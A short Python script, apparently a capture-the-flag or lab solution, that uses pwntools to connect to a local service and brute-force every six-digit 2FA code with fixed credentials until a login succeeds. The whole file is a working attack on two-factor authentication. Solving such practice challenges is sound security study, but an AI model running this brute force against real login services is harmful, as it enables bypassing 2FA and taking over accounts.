from pwn import *

#Setting varibles
HOST, PORT = "127.0.0.1", 30000

#Connecting to the server
p = remote(HOST, PORT)

# Enumerate 6-digit codes
for i in range(100000, 1000000):
    code = f'{i:06d}'
    p.recvuntil('LOGIN\nUsername:\n')
    p.sendline('username')
    p.recvuntil('Password:\n')
    p.sendline('password')
    p.recvuntil('2FA Code:\n')
    p.sendline(f'{code}')
    
 #Print the response
    response = p.recvline().decode()
    print(response)
    if 'Login Successful!' in response:
        print(f'Found correct code: {code}')
        break
